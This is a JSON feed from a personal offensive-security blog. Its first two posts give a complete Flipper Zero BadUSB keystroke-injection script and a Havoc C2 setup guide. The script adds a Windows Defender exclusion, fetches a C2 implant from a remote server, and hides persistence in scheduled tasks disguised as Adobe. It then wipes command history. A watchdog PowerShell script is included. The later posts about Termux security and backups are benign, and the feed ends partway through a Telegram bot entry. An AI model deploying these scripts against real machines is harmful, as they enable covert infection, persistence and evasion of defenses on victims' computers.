{
    "version": "https://jsonfeed.org/version/1",
    "title": "Cibersec and hacking blog",
    "description": "",
    "home_page_url": "https://b4shnhawx.github.io",
    "feed_url": "https://b4shnhawx.github.io/feed.json",
    "user_comment": "",
    "author": {
        "name": "b4shnhawx"
    },
    "items": [
        {
            "id": "https://b4shnhawx.github.io/flipper-zero-badusb.html",
            "url": "https://b4shnhawx.github.io/flipper-zero-badusb.html",
            "title": "Deploying C2 malware pt.2 [2] - Flipper Zero BadUSB",
            "summary": "Taking a step further from what we saw in the Havoc C2 post, let's take it a step further. Lets use the app BadUSB from Flipper Zero&hellip;",
            "content_html": "<p>Taking a step further from what we saw in the <a href=\"https://b4shnhawx.github.io/creating-c2-with-havoc-in-kali-linux.html\">Havoc C2 post</a>, let's take it a step further. </p>\n<p>Lets use the app BadUSB from Flipper Zero to inject malicious code in Windows 10/11 (also you can use Rubber Ducky). <br><br>In the lab we will:</p>\n<ul>\n<li>Avoid the detection in Windows Defender [<span style=\"color: #b96ad9;\">EVASION </span>: <span style=\"color: #e03e2d;\">T1564.012</span>].</li>\n<li>Download the payload from the Havoc server [<span style=\"color: #b96ad9;\">OBTAIN CAPABILITIES</span> : <span style=\"color: #e03e2d;\">T1588.001</span>].</li>\n<li>Create a task to execute it every boot and logon [<span style=\"color: #b96ad9;\">PERSISTENCE</span> : <span style=\"color: #e03e2d;\">T1053.005</span>].</li>\n<li>OPTIONAL - Deploy a script that checks if the demon.exe its currently running to avoid duplicate processes and difficult the detection [<span style=\"color: #b96ad9;\">EVASION</span>].<br><br></li>\n</ul>\n<h3><strong>HOW IT WORKS?</strong></h3>\n<hr class=\"line\">\n<p>Simply put, each device has a HID (Human Interface Device) that identifies which device it is. <br><br>Rubber Ducky (and Flipper Zero's BadUSB) shows the computer that its HID corresponds to a keyboard or mouse, allowing it to <em>\"typing\"</em> from a preloaded script.<br><br></p>\n<h3>CREATION OF THE BADUSB / RUBBER DUCKY SCRIPT</h3>\n<hr class=\"line\">\n<ol>\n<li>We prepare the terminal by opening as admin (CTRL + SHIFT + ENTER), and establish the color of the console white and the letters in white to reduce the visual impact. Also, reduce the size of the console at minimun.<br><br>\n<pre class=\"language-bash\"><code>REM --&gt; Prepare terminal\nDELAY 1000\nREM --&gt; GUI d\nDELAY 150\nGUI r\nDELAY 400\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000\nALT y\nALT s\nDELAY 2000\nCTRL c\nDELAY 500\nSTRING color FE &amp; mode con:cols=15 lines=1\nENTER\nSTRING powershell\nENTER\nDELAY 50\nSTRING cd \"$env:USERPROFILE\\\"\nENTER\nDELAY 50</code></pre>\n</li>\n<li>Creates a new directory (example .adobe_reader) and then the exception for the Microsoft Defender. <br><br>\n<pre class=\"language-bash\"><code>REM --&gt; Exception\nSTRING New-Item -ItemType Directory -Path \"$env:UserProfile\\AppData\\Local\\.adobe_reader\" -Force &gt; $null 2&gt;&amp;1\nENTER\nDELAY 50\nSTRING Add-MpPreference -ExclusionPath \"$env:UserProfile\\AppData\\Local\\.adobe_reader\\demon.x64.exe\"\nENTER\nDELAY 50</code></pre>\n</li>\n<li>Connects the victim PC to the server following the next steps:<br><br>- Deletes in the known_hosts file the lines matching with the IP of the C2 server. This avoids any problem on the question \"save SSH certificate for future connections?\" in case we excecute the BadUSB before.<br>- Creates a backup of the file<br>- Connects to the server (user, IP and pass).<br>- Downloads the .exe and .ps1 into the exceptioned folder of the victim.<br>- Close the connection.<br><br>\n<pre class=\"language-bash\"><code>REM --&gt; Transfer C2 exe SSH\nSTRING (Get-Content \".\\.ssh\\known_hosts\") | Where-Object { $_ -notmatch \"&lt;SFTP\\.SERVER\\.IP&gt;\" } | Set-Content \".\\.ssh\\known_hosts\"\nENTER\nDELAY 100\nSTRING copy .\\.ssh\\known_hosts .\\.ssh\\known_hosts_bckp\nENTER\nDELAY 100\nSTRING sftp &lt;SFTP USER&gt;@&lt;SFTP.SERVER.IP&gt;\nENTER\nDELAY 500\nSTRING yes\nENTER\nDELAY 500\nSTRING &lt;SFTP PASSWORD&gt;\nENTER\nDELAY 500\nSTRING cd ../download\nENTER\nDELAY 100\nSTRING lcd AppData\\Local\\.adobe_reader\nENTER\nDELAY 100\nSTRING get demon.x64.exe\nENTER\nDELAY 2000\nSTRING get Adobe_Reader_Init.ps1\nENTER\nDELAY 2000\nSTRING bye\nENTER\nDELAY 100</code></pre>\n</li>\n<li>Set persistence by:<br>- Creates a new folder in the Microsoft folder of the scheduled tasks.<br>- Creates a new task executed always at boot. The command as its configured avoids that a powershell window opens at boot.<br>- Creates a new task executed always at login event. The command as its configured avoids that a powershell window opens at the login event.<br>- Finally, runs the task to launch the .ps1 / .exe<br><br>\n<blockquote>NOTE: In this example I'm using the .ps1 to launch the .exe. As we said, the powershell checks if there is other processes already connected to not duplicate processes and connections (and get more difficult to been detected by the user).</blockquote>\n<pre class=\"language-bash\"><code>REM --&gt; Persistence\nSTRING $scheduleObject = New-Object -ComObject schedule.service; $scheduleObject.connect(); $rootFolder = $scheduleObject.GetFolder(\"\\Microsoft\"); $rootFolder.CreateFolder(\"Adobe\")\nENTER\nDELAY 100\nSTRING schtasks /create /sc onstart /tn \"Microsoft\\Adobe\\AdobeServiceBoot\" /tr \"cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\\AppData\\Local\\.adobe_reader\\Adobe_Reader_Init.ps1’”\" /rl highest\nENTER\nDELAY 50\nSTRING schtasks /create /sc onevent /mo \"*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4648]]\" /ec Security /tn \"Microsoft\\Adobe\\AdobeServiceLogon\" /tr \"cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\\AppData\\Local\\.adobe_reader\\Adobe_Reader_Init.ps1’”\" /rl highest\nENTER\nDELAY 100\nSTRING schtasks /run /tn \"Microsoft\\Adobe\\AdobeServiceLogon\"\nENTER\nDELAY 100</code></pre>\n</li>\n<li>Deletion of fingerprints.<br><br>\n<pre class=\"language-bash\"><code>REM --&gt; Clean up\nSTRING REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f\nENTER\nDELAY 10\nSTRING copy .\\.ssh\\known_hosts_bckp .\\.ssh\\known_hosts\nENTER\nDELAY 100\nSTRING del .\\.ssh\\known_hosts_bckp\nENTER\nDELAY 10\nSTRING del AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nENTER\nDELAY 10\nSTRING exit\nENTER\nDELAY 10\nSTRING exit\nENTER\nDELAY 10</code></pre>\n</li>\n</ol>\n<h3> </h3>\n<h3>OPTIONAL - CREATION OF THE POWERSHELL SCRIPT</h3>\n<hr class=\"line\">\n<p>Simply put, each device</p>\n<ol>\n<li>Sets the variables names.<br><br>\n<pre class=\"language-bash\"><code>$processName = \"demon.x64.exe\"\n$executablePath = \"$env:USERPROFILE\\AppData\\Local\\.adobe_reader\\demon.x64.exe\"\n$serverIP = \"&lt;HAVOC SERVER IP&gt;\"</code></pre>\n</li>\n<li>Gets the PIDs of the proccesses that has an active connection with the C2 server.<br><br>\n<pre class=\"language-bash\"><code>$processesWithConnections = Get-NetTCPConnection |\n    Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq \"443\" -and $_.State -eq \"Established\" } |\n    Select-Object -Property OwningProcess\n\n$connectedProcessIds = $processesWithConnections | ForEach-Object { $_.OwningProcess }</code></pre>\n</li>\n<li>When we close the connection in Havoc, it only terminates the connection, but the process remains in the victim. With these lines, we achieve to kill the processes that no longer have a connection.<br><br>\n<pre class=\"language-bash\"><code>Get-Process -Name ($processName -replace \".exe\", \"\") -ErrorAction SilentlyContinue |\n    Where-Object { $connectedProcessIds -notcontains $_.Id } |\n    ForEach-Object {\n        Write-Output \"Terminate process $($processName) with ID $($_.Id) without connection.\"\n        Stop-Process -Id $_.Id -Force\n    }</code></pre>\n</li>\n<li>We get the proccesses with an active connection to the C2 server at port 443. <br><br>\n<pre class=\"language-bash\"><code>Get-Process -Name ($processName -replace \".exe\", \"\") -ErrorAction SilentlyContinue ; Get-NetTCPConnection | Select-Object -Property OwningProcess, LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Sort-Object -Property OwningProcess | Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq \"443\" }</code></pre>\n</li>\n<li>If already exists a proccess with an active connection, exits the script, but if there is no active connection against the C2 server, it executes the demon.exe.<br><br>\n<pre class=\"language-bash\"><code>if (-not $connectedProcessIds) {\n    Write-Output \"There are no processes with active connection. Executing $executablePath...\"\n    Start-Process -FilePath $executablePath -NoNewWindow\n} else {\n    Write-Output \"There is already a process with an active connection. No action is taken.\"\n}\n</code></pre>\n</li>\n</ol>\n<h3><strong>FULL BADUSB / RUBBER DUCKY SCRIPT</strong></h3>\n<hr class=\"line\">\n<pre class=\"language-bash\"><code>REM --&gt; Prepare terminal\nDELAY 1000\nREM --&gt; GUI d\nDELAY 150\nGUI r\nDELAY 400\nSTRING cmd\nCTRL-SHIFT ENTER\nDELAY 2000\nALT y\nALT s\nDELAY 2000\nCTRL c\nDELAY 500\nSTRING color FE &amp; mode con:cols=15 lines=1\nENTER\nSTRING powershell\nENTER\nDELAY 50\nSTRING cd \"$env:USERPROFILE\\\"\nENTER\nDELAY 50\nREM --&gt; Exception\nSTRING New-Item -ItemType Directory -Path \"$env:UserProfile\\AppData\\Local\\.adobe_reader\" -Force &gt; $null 2&gt;&amp;1\nENTER\nDELAY 50\nSTRING Add-MpPreference -ExclusionPath \"$env:UserProfile\\AppData\\Local\\.adobe_reader\\demon.x64.exe\"\nENTER\nDELAY 50\nREM --&gt; Transfer C2 exe SSH\nSTRING (Get-Content \".\\.ssh\\known_hosts\") | Where-Object { $_ -notmatch \"172\\.233\\.32\\.196\" } | Set-Content \".\\.ssh\\known_hosts\"\nENTER\nDELAY 100\nSTRING copy .\\.ssh\\known_hosts .\\.ssh\\known_hosts_bckp\nENTER\nDELAY 100\nSTRING sftp &lt;SFTP USER&gt;@&lt;SFTP SERVER IP&gt;\nENTER\nDELAY 500\nSTRING yes\nENTER\nDELAY 500\nSTRING &lt;SFTP PASSWORD&gt;\nENTER\nDELAY 500\nSTRING cd ../download\nENTER\nDELAY 100\nSTRING lcd AppData\\Local\\.adobe_reader\nENTER\nDELAY 100\nSTRING get demon.x64.exe\nENTER\nDELAY 2000\nSTRING get Adobe_Reader_Init.ps1\nENTER\nDELAY 2000\nSTRING bye\nENTER\nDELAY 100\nREM --&gt; Persistence\nSTRING $scheduleObject = New-Object -ComObject schedule.service; $scheduleObject.connect(); $rootFolder = $scheduleObject.GetFolder(\"\\Microsoft\"); $rootFolder.CreateFolder(\"Adobe\")\nENTER\nDELAY 100\nSTRING schtasks /create /sc onstart /tn \"Microsoft\\Adobe\\AdobeServiceBoot\" /tr \"cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\\AppData\\Local\\.adobe_reader\\Adobe_Reader_Init.ps1’”\" /rl highest\nENTER\nDELAY 50\nSTRING schtasks /create /sc onevent /mo \"*[System[Provider[@Name='Microsoft-Windows-Security-Auditing'] and EventID=4648]]\" /ec Security /tn \"Microsoft\\Adobe\\AdobeServiceLogon\" /tr \"cmd.exe /c start /min “” powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command “. ‘%USERPROFILE%\\AppData\\Local\\.adobe_reader\\Adobe_Reader_Init.ps1’”\" /rl highest\nENTER\nDELAY 100\nSTRING schtasks /run /tn \"Microsoft\\Adobe\\AdobeServiceLogon\"\nENTER\nDELAY 100\nREM --&gt; Clean up\nSTRING REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f\nENTER\nDELAY 10\nSTRING copy .\\.ssh\\known_hosts_bckp .\\.ssh\\known_hosts\nENTER\nDELAY 100\nSTRING del .\\.ssh\\known_hosts_bckp\nENTER\nDELAY 10\nSTRING del AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\nENTER\nDELAY 10\nSTRING exit\nENTER\nDELAY 10\nSTRING exit\nENTER\nDELAY 10</code></pre>\n<p> </p>\n<h3><strong>OPTIONAL - FULL POWERSHELL SCRIPT</strong></h3>\n<hr class=\"line\">\n<pre class=\"language-visual-basic\"><code>$processName = \"demon.x64.exe\"\n$executablePath = \"$env:USERPROFILE\\AppData\\Local\\.adobe_reader\\demon.x64.exe\"\n$serverIP = \"&lt;HAVOC SERVER IP&gt;\"\n\n$processesWithConnections = Get-NetTCPConnection |\n    Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq \"443\" -and $_.State -eq \"Established\" } |\n    Select-Object -Property OwningProcess\n\n$connectedProcessIds = $processesWithConnections | ForEach-Object { $_.OwningProcess }\n\nGet-Process -Name ($processName -replace \".exe\", \"\") -ErrorAction SilentlyContinue |\n    Where-Object { $connectedProcessIds -notcontains $_.Id } |\n    ForEach-Object {\n        Write-Output \"Terminate process $($processName) with ID $($_.Id) without connection.\"\n        Stop-Process -Id $_.Id -Force\n    }\n\nGet-Process -Name ($processName -replace \".exe\", \"\") -ErrorAction SilentlyContinue ; Get-NetTCPConnection | Select-Object -Property OwningProcess, LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Sort-Object -Property OwningProcess | Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq \"443\" }\n\nif (-not $connectedProcessIds) {\n    Write-Output \"There are no processes with active connection. Executing $executablePath...\"\n    Start-Process -FilePath $executablePath -NoNewWindow\n} else {\n    Write-Output \"There is already a process with an active connection. No action is taken.\"\n}\n</code></pre>\n<p> </p>",
            "image": "https://b4shnhawx.github.io/media/posts/17/Screenshot-20250107-185918.png",
            "author": {
                "name": "b4shnhawx"
            },
            "tags": [
                   "windows",
                   "powershell",
                   "os",
                   "offensive",
                   "hacking",
                   "flipperzero"
            ],
            "date_published": "2024-12-31T20:07:42+01:00",
            "date_modified": "2025-01-07T19:35:56+01:00"
        },
        {
            "id": "https://b4shnhawx.github.io/creating-c2-with-havoc-in-kali-linux.html",
            "url": "https://b4shnhawx.github.io/creating-c2-with-havoc-in-kali-linux.html",
            "title": "Deploying C2 malware pt.1 [2] - Creating C2 with HAVOC in Kali Linux",
            "summary": "You may have heard that ‘bad guys can connect to your computer to do bad things’, but how and why? There are actually many ways to infect&hellip;",
            "content_html": "<p>You may have heard that ‘bad guys can connect to your computer to do bad things’, but how and why?<br><br></p>\n<h3><strong>INTRODUCING TO HAVOC C2</strong></h3>\n<hr class=\"line\">\n<p>There are actually many ways to infect a computer and get the bad guys to connect, but one of the favourite ways for cybercriminals is to make use of command and control servers (C2 or C&amp;C for friends). These servers act as the central node of a network of infected computers so that they can easily manage them all at once and send commands to the computers (called zombie computers).<br><br></p>\n<p>Through an agent with a payload that has been installed on the computer (either by the user or by the attacker himself), the infected computer connects to the server and waits to receive commands to perform actions as we would do with a reverse shell. <br>The difference is that with a C2 server we can send commands to tens, hundreds or thousands of computers at the same time. Perfect for DDoS attacks, isn't it?<br><br></p>\n<div style=\"text-align: center;\"><figure class=\"post__image\"><img loading=\"lazy\"  style=\"width: auto; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/c2c_infra.png\" alt=\"Command example\" data-is-external-image=\"true\"></figure></div>\n<p>Next we will see how to configure a Kali Linux as C2 with Havoc.<br><br></p>\n<h3><strong>INSTALLING HAVOC</strong></h3>\n<hr class=\"line\">\n<p>First of all, update the repositories and install Havoc.<br><br></p>\n<pre class=\"language-bash\"><code>sudo apt update -y &amp;&amp; sudo apt upgrade -y\nsudo apt get install havoc</code></pre>\n<h3><strong><br>HAVOC SERVER - CONFIGU</strong><strong>RING THE TEAM SERVER</strong></h3>\n<hr class=\"line\">\n<p> </p>\n<p>Now we will move to the Havoc directory and create a new profile in which we will customise:</p>\n<ul>\n<li>Port (we can leave it as default: 40056)</li>\n<li>User</li>\n<li>Password</li>\n</ul>\n<pre class=\"language-bash\"><code>cd /usr/share/havoc\ncp ./profiles/havoc.yaotl ./profiles/c2test.yaotl\nnano ./profiles/c2test.yaotl</code></pre>\n<pre class=\"language-bash\"><code>Teamserver {\n    Host = \"0.0.0.0\"\n    Port = XXXXX\n\n    Build {\n        Compiler64 = \"/usr/bin/x86_64-w64-mingw32-gcc\"\n        Compiler86 = \"/usr/bin/i686-w64-mingw32-gcc\"\n        Nasm = \"/usr/bin/nasm\"\n    }\n}\n\nOperators {\n    user \"USER\" {\n        Password = \"PASSWORD\"\n    }\n}\n\n# this is optional. if you dont use it you can remove it.\nService {\n    Endpoint = \"service-endpoint\"\n    Password = \"service-password\"\n}\n\nDemon {\n    Sleep = 2\n    Jitter = 15\n\n    TrustXForwardedFor = false\n\n    Injection {\n        Spawn64 = \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n        Spawn32 = \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\"\n    }\n}</code></pre>\n<p>Finally, we will execute the server with our customised profile.<br><br></p>\n<pre class=\"language-bash\"><code>havoc server --profile ./profiles/c2test.yaotl -v</code></pre>\n<div style=\"text-align: center;\"><figure class=\"post__image\"><img loading=\"lazy\"  style=\"width: auto; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_server.png\" alt=\"Command example\" data-is-external-image=\"true\"></figure></div>\n<h3><strong><br></strong><strong>HAVOC CLIENT - CONNECTING TO THE TEAM SERVER</strong></h3>\n<hr class=\"line\">\n<p>Now we must connect to the server through the client. This will be done on the same machine, but the client will be able to connect to the server from any other machine as long as it is configured.</p>\n<p>If we want the C2 to work over the internet we must set the public IP of the C2 server.<br><br></p>\n<pre class=\"language-bash\"><code>havoc client</code></pre>\n<p> </p>\n<div style=\"text-align: center;\"><figure class=\"post__image\"><img loading=\"lazy\"  style=\"width: auto; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_client.png\" alt=\"Command example\" data-is-external-image=\"true\"></figure></div>\n<p>When we connect to the server, the GUI will open where we will work.<br><br></p>\n<div style=\"text-align: center;\"><figure class=\"post__image\"><img loading=\"lazy\"  style=\"width: auto; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_client_gui.png\" alt=\"Command example\" data-is-external-image=\"true\"></figure></div>\n<p>The first step here is to create a listener. To do this, we will go to <em>View → Listeners → Add</em>.<br><br></p>\n<figure class=\"post__image\"><img loading=\"lazy\"  style=\"width: auto; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_listener.png\" alt=\"Command example\" data-is-external-image=\"true\"></figure>\n<p>Now we will create a payload with which we will make the victim connect to our C2 server. To do this we must go to the menu <em>Attack → Payload</em>, and in my case I will create an executable with the listener that we just created.<br><br>It is normal that during the process, the CPU usage is kept at 100%, as it is compiling all the payload content.<br><br></p>\n<figure class=\"post__image\"><img loading=\"lazy\"  style=\"width: auto; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_payload.png\" alt=\"Command example\" data-is-external-image=\"true\"></figure>\n<h3><strong>INFECTING THE VICTIM</strong></h3>\n<hr class=\"line\">\n<p>Finally, we will reproduce a real attack by running the executable on the victim machine.<br>In a normal environment, the antivirus SHOULD stop the executable (if it doesn't, change the antivirus or update it), so we will have to save a folder for the test.<br><br>To use the exception in Windows Defender, simply run the following command in a powershell with elevated permissions.<br><br></p>\n<pre class=\"language-bash\"><code>Add-MpPreference -ExclusionPath \"C:\\Users\\USER\\Downloads\\demon.https.x64.exe\"</code></pre>\n<p><br>When we run it on the victim we will see how the machine information appears in Havoc.<br><br></p>\n<figure class=\"post__image post__image--wide\"><img loading=\"lazy\"  style=\"width: auto; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_infected.png\" alt=\"Command example\" data-is-external-image=\"true\"></figure>\n<figure class=\"post__image post__image--wide\">From here, we can interact with the victim to execute commands, view files and even download them.<br><br><img loading=\"lazy\"  style=\"width: auto; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_interact.png\" alt=\"Command example\" data-is-external-image=\"true\"></figure><br><br></p>",
            "image": "https://b4shnhawx.github.io/media/posts/16/preview.png",
            "author": {
                "name": "b4shnhawx"
            },
            "tags": [
                   "os",
                   "offensive",
                   "linux",
                   "hacking"
            ],
            "date_published": "2024-12-31T16:26:31+01:00",
            "date_modified": "2025-01-02T23:22:21+01:00"
        },
        {
            "id": "https://b4shnhawx.github.io/securing-termux-with-fingerprint.html",
            "url": "https://b4shnhawx.github.io/securing-termux-with-fingerprint.html",
            "title": "Securing Termux with fingerprint",
            "summary": "Termux is becoming a tool I use more and more, so I started looking into how I could secure it so that only I can have access&hellip;",
            "content_html": "<p>Termux is becoming a tool I use more and more, so I started looking into how I could secure it so that only I can have access to it. <br><br>I've also added another small layer of security so that I can lock some commands with my fingerprint. <br><br>Lets see.<br><br></p>\n<div class=\"tittle__line\">\n<h3><strong>SECURING TERMUX WHEN OPENING A NEW TERMINAL</strong></h3>\n<hr class=\"line\">\n<p>At de beggining of the file .zshrc (.bashrc by default)</p>\n<p> </p>\n<pre class=\"language-bash\"><code># Security finger print\necho \"\\n----==== SYSTEM LOCKED ====----\\n\"\ntermux-fingerprint | grep -q \"AUTH_RESULT_SUCCESS\" &amp;&amp; {\n    echo -e \"\\n\\e[32m     -= ACCESS GRANTED! =-  \\e[0m\\n\"\n} || {\n    echo -e \"\\n\\e[31m     -= ACCESS DENIED!! =-  \\e[0m\\n\"\n    sleep 1\n    exit 1\n}\n\n.........</code></pre>\n<div class=\"tittle__line\">\n<div class=\"gallery-wrapper\"><div class=\"gallery\"  data-is-empty=\"false\" data-translation=\"Add images\" data-columns=\"2\">\n<figure class=\"gallery__item\"><a href=\"https://b4shnhawx.github.io/media/posts/15/gallery/Screenshot_2024-08-23-13-01-35-548_com.termux.jpg\" data-size=\"1080x875\"><img loading=\"lazy\" src=\"https://b4shnhawx.github.io/media/posts/15/gallery/Screenshot_2024-08-23-13-01-35-548_com.termux-thumbnail.jpg\" alt=\"Acces denied\" width=\"720\" height=\"583\"></a>\n<figcaption>Example of failures when reading the fingerprint</figcaption>\n</figure>\n<figure class=\"gallery__item\"><a href=\"https://b4shnhawx.github.io/media/posts/15/gallery/Screenshot_2024-08-23-13-02-28-933_com.termux.jpg\" data-size=\"1080x875\"><img loading=\"lazy\" src=\"https://b4shnhawx.github.io/media/posts/15/gallery/Screenshot_2024-08-23-13-02-28-933_com.termux-thumbnail.jpg\" alt=\"Acces granted\" width=\"720\" height=\"583\"></a>\n<figcaption>Example of authorised access</figcaption>\n</figure>\n</div></div>\n<p>This will mean that every time we open a session on Termux, it will ask for our fingerprint to validate that it is us. Obviously, this won't work if you don't have your fingerprint configured on your smartphone.<br><br></p>\n<h3><strong>SECURING CUSTOMISED ALIASES</strong></h3>\n<hr class=\"line\">\n<p>Also, we can create alias to securize different commands at the end of the .zshrc file.<br><br></p>\n<p>For example:<br><br></p>\n<pre class=\"language-bash\"><code>.........\n\n# MY FUNCTIONS\ncheck_finger_access() {\n    local command=\"$1\"\n    shift\n\n    termux-fingerprint | grep -q \"AUTH_RESULT_SUCCESS\" &amp;&amp; {\n        echo -e \"\\n\\e[32m&gt; ACCESS GRANTED &lt;\\e[0m\\n\"\n        command $command \"$@\"\n    } || {\n        echo -e \"\\n\\e[31m&gt; ACCESS DENIED &lt;\\e[0m\\n\"\n        return 1\n    }\n}\n\n# MY ALIAS COMMANDS\n\nalias nano='check_finger_access nano'\nalias bash='check_finger_access bash'</code></pre>\n<p>When we go to execute the nano or bash commands, Termux will ask us to check the fingerprint.</p>\n<p> </p>\n<div class=\"tittle__line\">\n<h3><strong>SCRIPT TO ENABLE / DISABLE CHECKING ON ALIASES</strong></h3>\n<hr class=\"line\">\n<p>In addition, we can create a script to change whether we want to enable or disable these aliases so that we are only prompted for the fingerprint when opening Termux:<br><br></p>\n<pre class=\"language-bash\"><code>#!/bin/bash\n\n# Archivo donde se aplicarán los cambios\nZSHRC_FILE=\"$HOME/.zshrc\"\n\n# Patrón a buscar\nPATTERN=\"='check_finger_access \"\nEXCEPTION=\"switch_finger_check.sh\"\n\n# Verificar si ya hay líneas comentadas que coincidan con el patrón\nif grep -q \"^#.*$PATTERN\" \"$ZSHRC_FILE\"; then\n    # Descomentar las líneas que contengan el patrón, pero no la excepción\n    sed -i \"/^#.*$PATTERN/ {/$EXCEPTION/!s/^#//}\" \"$ZSHRC_FILE\"\n    echo -e \"&gt; Security fingerprint \\e[32menabled\\e[0m\"\n    echo -e \"&gt; Restart needed to apply changes\\n\"\nelse\n    # Comentar las líneas que contengan el patrón, pero no la excepción\n    sed -i \"/$PATTERN/ {/$EXCEPTION/!s/^/#/}\" \"$ZSHRC_FILE\"\n    echo -e \"&gt; Security fingerprint \\e[31mdisabled\\e[0m\"\n    echo -e \"&gt; Restart needed to apply changes\\n\"\nfi</code></pre>\n<p>We create another alias requesting also the fingerprint before enabling/disabling the fingerprint check:<br><br></p>\n<pre class=\"language-bash\"><code>alias sectermux='check_finger_access bash /data/data/com.termux/files/home/Scripts/switch_finger_check.sh'</code></pre>\n<p> </p>\n<p><strong style=\"font-family: var(--font-base); font-size: 1.42383em; letter-spacing: var(--letter-spacing);\">DISCLAIMERS</strong></p>\n</div>\n</div>\n<div class=\"tittle__line\"><hr class=\"line\">\n<ul>\n<li>Blocking by alias is not a foolproof method. For example, if you want to block editing of files by creating an alias with nano, any user could bypass the fingerprint check by using any other editor or even modifying lines with sed or awk.</li>\n<li>If you have an SSH server in Termux, when you try to connect remotely, it will ask for the fingerprint in Termux (although you will probably have to open Termux before you can connect again). It would work like a 2FA.</li>\n</ul>\n</div>\n</div>",
            "image": "https://b4shnhawx.github.io/media/posts/15/Screenshot_2024-08-23-13-02-28-933_com.termux-2.jpg",
            "author": {
                "name": "b4shnhawx"
            },
            "tags": [
                   "termux",
                   "programming",
                   "os",
                   "linux",
                   "bash"
            ],
            "date_published": "2024-08-23T12:42:10+02:00",
            "date_modified": "2024-08-23T13:39:12+02:00"
        },
        {
            "id": "https://b4shnhawx.github.io/auto-backup-for-termux.html",
            "url": "https://b4shnhawx.github.io/auto-backup-for-termux.html",
            "title": "Auto backup for Termux",
            "summary": "Needless to say, Termux is an incredible tool for any Linux enthusiast. It is an Android terminal emulator, and has nothing to do with a virtualised or&hellip;",
            "content_html": "<p>Needless to say, <strong>Termux is an incredible tool for any Linux enthusiast</strong>. It is an Android terminal emulator, and has nothing to do with a virtualised or simulated installation. That is, with it we would be interacting directly with our Android device, but of course, with limited and restricted access outside the Termux installation directory and, above all, to the hardware.<br><br>Even so, with Termux we can tinker a lot creating scripts or installing packages as in any other machine.<br><br>The problem comes when you are constantly changing things and trying things out. That's when you realise, you've been installing packages for 2 hours and making so many changes that you don't know what you've done and you think, <em>\"why wouldn't I make a backup before to restore termux to a state before I messed up?\"</em>.<br><br></p>\n<p>That is why I have created a bash script for this task:<br><br></p>\n<ul dir=\"auto\">\n<li>Creates a backup (home directory included) of Termux.</li>\n<li>Searches for backups older than 7 days and deletes them.</li>\n<li>Sends a notification to the mobile when it finishes (OK or ERROR).</li>\n<li>Creates a .log record of the actions it performs.</li>\n<li>(extra) With Drive sync I synchronize the path of Termux to have everything in Drive.</li>\n</ul>\n<p>You can see the project in my Github: <a href=\"https://github.com/b4shnhawx/termux-backup/tree/main\">b4shnhawx/termux-backup</a><br><br></p>\n<div class=\"tittle__line\">\n<h3><strong>USE CASE</strong></h3>\n<hr class=\"line\">\n<p>The script itself is not very complicated. If you wish, you can format the date, name and path where the backups will be saved in the variables in lines 3 to 6.<br><br></p>\n<div style=\"text-align: center;\"><figure class=\"post__image\"><img loading=\"lazy\"  style=\"width: auto; height: auto;\" src=\"https://raw.githubusercontent.com/b4shnhawx/termux-backup/main/images/bash-script.jpg\" alt=\"Command example\" data-is-external-image=\"true\"></figure></div>\n<div> </div>\n<div>We already have the script. So now we need to set up crontab to run the script every day at X time. To do this:</div>\n<div>\n<pre class=\"language-bash\"><code>crontab -e</code></pre>\nIn my case I want the backup to run every day at 5 AM.<br><br>\n<pre class=\"language-bash\"><code>0 5 * * * bash /data/data/com.termux/files/home/scripts/termux_backup.sh</code></pre>\n<p> </p>\n</div>\n</div>",
            "image": "https://b4shnhawx.github.io/media/posts/8/files.jpg",
            "author": {
                "name": "b4shnhawx"
            },
            "tags": [
                   "termux",
                   "programming",
                   "os",
                   "linux",
                   "bash"
            ],
            "date_published": "2024-08-21T11:43:00+02:00",
            "date_modified": "2024-08-22T20:17:40+02:00"
        },
        {
            "id": "https://b4shnhawx.github.io/ssh-telegrambot-in-python.html",
            "url": "https://b4shnhawx.github.io/ssh-telegrambot-in-python.html",
            "title": "SSH TelegramBot in Python",
            "summary": "Today I bring you a project that I finished some time ago, but that has earned a place in my favourite projects: a bot for Telegram. Ok,&hellip;",
